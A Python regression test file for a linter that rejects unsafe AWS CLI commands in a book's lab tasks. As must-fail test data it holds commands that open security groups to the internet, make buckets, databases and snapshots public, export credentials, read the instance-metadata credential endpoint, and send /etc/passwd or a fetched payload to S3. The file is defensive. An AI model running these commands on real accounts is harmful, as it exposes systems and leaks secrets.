"""Regression tests for the holes of _build/reports/gate-break-practice.md that live in saalib/lab.py (tasks).
The attempt number of the gate breaker is in each test name. Offline; no helper is run.
"""
import os
import shutil
import unittest
from unittest import mock

import sandbox
from saalib import common, lab
from test_lab import T2, LabCase

SG = "aws ec2 authorize-security-group-ingress --group-id <SG_ID> "


class Commands(LabCase):
    def banned(self, command):
        with sandbox.paths(self.book):
            return lab._banned(self.ctx(), command)

    def form(self, command, text="SG_ID VPC_ID"):
        with sandbox.paths(self.book):
            return lab._form_errors(self.ctx(), command, text)

    def test_must_fail_47_world_in_other_spellings_and_other_operations(self):
        bad = [
            SG + "--ip-permissions IpProtocol=tcp,FromPort=20,ToPort=25,Ipv6Ranges=[{CidrIpv6=0:0:0:0:0:0:0:0/0}]",
            SG + "--ip-permissions IpProtocol=tcp,FromPort=20,ToPort=25,PrefixListIds=[{PrefixListId=pl-0123}]",
            SG + "--ip-permissions IpProtocol=tcp,FromPort=20,ToPort=25,IpRanges=[{CidrIp=0.0.0.0/1},{CidrIp=128.0.0.0/1}]",
            "aws ec2 modify-security-group-rules --group-id <SG_ID> --security-group-rules SecurityGroupRuleId=sgr-0123,"
            "SecurityGroupRule={IpProtocol=tcp,FromPort=22,ToPort=22,CidrIpv4=0.0.0.0/0}",
            "aws ec2 replace-network-acl-entry --network-acl-id <ACL_ID> --ingress --rule-number 100 --protocol 6 "
            "--port-range From=22,To=22 --cidr-block 0.0.0.0/0 --rule-action allow",
        ]
        for command in bad:
            self.assertTrue(self.banned(command), command)
        ok = SG + "--ip-permissions IpProtocol=tcp,FromPort=443,ToPort=443,IpRanges=[{CidrIp=10.0.0.0/16}]"
        self.assertEqual(self.banned(ok), [])

    def test_must_fail_47_rules_in_a_file(self):
        for command in (SG + "--ip-permissions file://rules.json", SG + "--cli-input-json file://open-ssh.json"):
            self.assertTrue(self.form(command), command)

    def test_must_fail_48_public_exposure_by_other_commands(self):
        bad = [
            "aws s3api put-bucket-policy --bucket saa-b --policy '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\","
            "\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::saa-b/*\"}]}'",
            "aws rds modify-db-instance --db-instance-identifier saa-db --publicly-accessible --apply-immediately",
            "aws ec2 modify-snapshot-attribute --snapshot-id snap-0123 --attribute createVolumePermission --operation-type add --group-names all",
            "aws lambda add-permission --function-name saa-fn --statement-id open --action lambda:InvokeFunction --principal '*'",
            "aws lambda create-function-url-config --function-name saa-fn --auth-type NONE",
            "aws ec2 modify-image-attribute --image-id ami-0123 --launch-permission Add=[{Group=all}]",
        ]
        for command in bad:
            self.assertTrue(self.banned(command), command)
        deny = ("aws s3api put-bucket-policy --bucket saa-b --policy '{\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\","
                "\"Action\":\"s3:*\",\"Resource\":\"arn:aws:s3:::saa-b/*\",\"Condition\":{\"Bool\":{\"aws:SecureTransport\":\"false\"}}}]}'")
        self.assertEqual(self.banned(deny), [])
        self.assertEqual(self.banned("aws rds modify-db-instance --db-instance-identifier saa-db --no-publicly-accessible"), [])

    def test_must_fail_49_credentials_and_curl_that_is_not_read_only(self):
        for command in ("aws configure export-credentials --format env", "aws sts get-session-token --duration-seconds 129600",
                        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/saa-role"):
            self.assertTrue(self.banned(command), command)
        self.assertTrue(self.form("curl --json '{\"k\":\"v\"}' https://api.example.com/create"))
        self.assertEqual(self.form("curl -sI https://docs.aws.amazon.com/"), [])

    def test_must_fail_50_more_than_one_command_redirects_and_other_variables(self):
        bad = [
            "aws s3 ls\naws iam list-users",
            "aws s3 cp <(curl -s https://example.com/payload) s3://saa-b/payload",
            "aws sts get-caller-identity > /home/cloudshell-user/.aws/config",
            "aws s3api put-object --bucket saa-b --key k --body /dev/stdin < /etc/passwd",
            "aws ec2 describe-vpcs --vpc-ids ${VPC_ID}",
            "aws ec2 describe-vpcs --vpc-ids $vpc_id",
        ]
        for command in bad:
            self.assertTrue(self.form(command), command)
        self.assertEqual(self.form("aws ec2 describe-security-groups --group-ids <SG_ID> "
                                   "--query 'SecurityGroups[?length(IpPermissions) > `0`].GroupId'"), [])


class TaskRules(LabCase):
    def test_must_fail_44_creating_verbs_outside_the_list_and_a_cleanup_that_deletes_nothing(self):
        def fn(items):
            items[T2]["steps"][0]["command"] = "aws widget put-shelf --name saa-breaker-shelf"
            items[T2]["steps"][2]["command"] = "aws widget import-shelf --name saa-breaker-shelf-2"
            items[T2]["cleanup"] = [{"text": "List the shelves.", "command": "aws widget list-shelves"}]
        self.change(fn)
        codes = self.codes()
        self.assertIn("T103", codes)        # no cleanup command deletes anything
        self.assertIn("T106", codes)        # import-shelf has no tag
        self.assertGreaterEqual(codes.count("T107"), 2)     # put-shelf and import-shelf are not undone

    def test_must_fail_45_cleanup_of_another_resource_or_a_dry_run(self):
        def other(items):
            for step in items[T2]["cleanup"]:
                step["command"] = "aws widget delete-shelf --name saa-some-other-shelf"
        self.change(other)
        self.assertIn("T107", self.codes())

        def dry(items):
            for step in items[T2]["cleanup"]:
                step["command"] = "aws widget delete-shelf --name saa-sample-shelf --dry-run"
        self.change(dry)
        self.assertIn("T107", self.codes())

    def test_must_fail_46_run_instances_undone_by_stop_instances(self):
        task = {"steps": [{"text": "x", "command": "aws ec2 run-instances --image-id <AMI_ID> --count 1"}],
                "cleanup": [{"text": "x", "command": "aws ec2 stop-instances --instance-ids <INSTANCE_ID>"}]}
        with sandbox.paths(self.book):
            self.assertEqual(len(lab._pairing(self.ctx(), task)), 1)
            task["cleanup"][0]["command"] = "aws ec2 terminate-instances --instance-ids <INSTANCE_ID>"
            self.assertEqual(lab._pairing(self.ctx(), task), [])

    def test_must_fail_51_tag_text_outside_a_tag_option(self):
        def fn(items):
            items[T2]["steps"][0]["command"] = 'aws widget create-shelf --name saa-sample-shelf --description "book=saa task=sample-t02"'
        self.assert_fails("T106", fn)

        def verify(items):
            items[T2]["verify"]["command"] = "aws widget list-shelves --name book=saa"
        self.assert_fails("T108", verify)

    def test_must_fail_52_cost_hidden_behind_dollar_zero(self):
        def fn(items):
            items[T2]["cost"] = "$0 (the NAT gateway bills about 4.50 USD for each hour)"
            items[T2]["cost_if_forgotten"] = "$0, plus a few cents for each day"
        self.change(fn)
        messages = [f["msg"] for f in self.lint()["errors"] if f["code"] == "T109"]
        self.assertTrue(any("4.50" in m for m in messages), messages)
        self.assertTrue(any("without an amount" in m for m in messages), messages)

    def test_must_fail_53_a_look_that_deletes(self):
        def fn(items):
            items[0]["steps"][1]["command"] = "aws widget delete-shelf --name saa-prod-shelf"
        self.assert_fails("T103", fn)

    def test_must_fail_54_untaggable_create_with_no_tag_and_no_prefix(self):
        def spec(s):
            s["tasks"]["untaggable_operations"] = ["create-bucket"]
        sandbox.edit_json(self.book / "_build" / "style" / "SPEC.json", spec)

        def fn(items):
            items[T2]["steps"][0]["command"] = "aws s3api create-bucket --bucket company-data-2026"
            items[T2]["cleanup"][1]["command"] = "aws s3api delete-bucket --bucket company-data-2026"
        self.change(fn)
        self.assertIn("T106", self.codes())

        def named(items):
            items[T2]["steps"][0]["command"] = "aws s3api create-bucket --bucket saa-data-2026"
            items[T2]["cleanup"][1]["command"] = "aws s3api delete-bucket --bucket saa-data-2026"
        self.change(named)
        self.assertNotIn("T106", self.codes())

    def test_must_fail_56_hand_written_cli_report_without_rows(self):
        with sandbox.paths(self.book):
            doc = common.read_json(self.tasks)
            common.write_json(common.REPORTS / "cli" / "99.json", {"chapter": "99", "ok": True, "commands": [],
                                                                    "commands_sha256": lab.commands_sha256(doc)})
        self.assertIn("T113", self.codes(ship=True))


class VerifyByName(LabCase):
    """T108 exception (2026-10-12): a resource that no tag filter finds (an IAM role is not listed by the Resource
    Groups Tagging API) is verified by a read-only command that names it by the task's own saa- name, with an expect."""
    GONE = "An error that says NotFound: the shelf no longer exists."

    def t108(self):
        return [f["msg"] for f in self.lint()["errors"] if f["code"] == "T108"]

    def verify(self, command, expect=GONE):
        def fn(items):
            items[T2]["verify"] = {"command": command, "expect": expect}
        return fn

    def test_must_fail_verify_names_a_resource_without_the_prefix(self):
        def fn(items):
            items[T2]["steps"][0]["command"] = "aws widget create-shelf --name sample-shelf --tags book=saa,task=sample-t02"
            items[T2]["cleanup"][1]["command"] = "aws widget delete-shelf --name sample-shelf"
            items[T2]["verify"] = {"command": "aws widget get-shelf --name sample-shelf", "expect": self.GONE}
        self.assert_fails("T108", fn)

    def test_must_fail_verify_names_a_saa_resource_the_task_does_not_create(self):
        self.assert_fails("T108", self.verify("aws widget get-shelf --name saa-other-shelf"))

    def test_must_fail_verify_by_name_that_is_not_read_only(self):
        self.change(self.verify("aws widget delete-shelf --name saa-sample-shelf"))
        messages = self.t108()
        self.assertTrue(any("not read-only" in m for m in messages), messages)
        self.assertTrue(any("does not filter" in m for m in messages), messages)     # the exception does not apply

    def test_must_fail_verify_with_neither_tag_nor_name(self):
        self.assert_fails("T108", self.verify("aws widget describe-shelves --region eu-west-1"))

    def test_must_fail_verify_by_name_without_an_expected_result(self):
        self.change(self.verify("aws widget get-shelf --name saa-sample-shelf", expect="  "))
        self.assertTrue(self.t108())

    def test_verify_by_name_with_a_read_only_get_passes(self):
        self.change(self.verify("aws widget get-shelf --name saa-sample-shelf"))
        self.assertEqual(self.t108(), [])
        self.assertEqual(self.codes(), [])

    def test_verify_with_get_role_after_cleanup_passes(self):
        """The shape of iam-t02: a tagged create-role, and get-role on its saa- name expecting NoSuchEntity."""
        trust = ('{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},'
                 '"Action":"sts:AssumeRole"}]}')

        def fn(items):
            items[T2]["steps"][0]["command"] = (f"aws iam create-role --role-name saa-sample-t02 --assume-role-policy-document '{trust}' "
                                                "--tags Key=book,Value=saa Key=task,Value=sample-t02")
            items[T2]["cleanup"][1]["command"] = "aws iam delete-role --role-name saa-sample-t02"
            items[T2]["verify"] = {"command": "aws iam get-role --role-name saa-sample-t02",
                                   "expect": "An error that says NoSuchEntity: the role no longer exists."}
        self.change(fn)
        code, result, err = sandbox.run_json(self.book, "tasks", "lint", "99")
        self.assertIn(code, (0, 2), err)
        self.assertEqual(result["errors"], [])


class RealCliModel(LabCase):
    def test_must_fail_55_misspelled_words_that_are_not_option_names(self):
        """The real helper, from the uv cache only (no network request). Skipped when uv or awscli is not there."""
        if not shutil.which("uv"):
            self.skipTest("uv is not installed")
        bad = ["aws ec2 describe-instances -filters Name=tag:book,Values=saa",
               "aws ec2 describe-instances filters Name=tag:book,Values=saa",
               "aws ec2 describe-instances --filters Nmae=tag:book,Vaules=saa",
               "aws ec2 describe-instances --output jsno",
               "aws ec2 describe-instances --query Resrevations[].Instnaces[].InstanceId"]
        good = ["aws ec2 describe-instances --filters Name=tag:book,Values=saa --query 'Reservations[].Instances[].InstanceId' --output text",
                "aws ec2 run-instances --image-id ami-1 --count 1 --tag-specifications 'ResourceType=instance,Tags=[{Key=book,Value=saa}]'",
                "aws s3 cp notes.txt s3://saa-bucket/notes.txt",
                "aws s3api list-objects-v2 --bucket saa-bucket --max-items 5 --no-paginate",
                "aws sts get-caller-identity"]
        with mock.patch.dict(os.environ, {"SAA_UV_OFFLINE": "1"}):
            try:
                rows = lab._run_helper(bad + good)
            except lab.HelperError as exc:
                self.skipTest(f"awscli is not in the uv cache: {exc}")
        self.assertEqual([r["ok"] for r in rows[:len(bad)]], [False] * len(bad), [r["errors"] for r in rows[:len(bad)]])
        self.assertEqual([r["errors"] for r in rows[len(bad):]], [[]] * len(good))


if __name__ == "__main__":
    unittest.main()
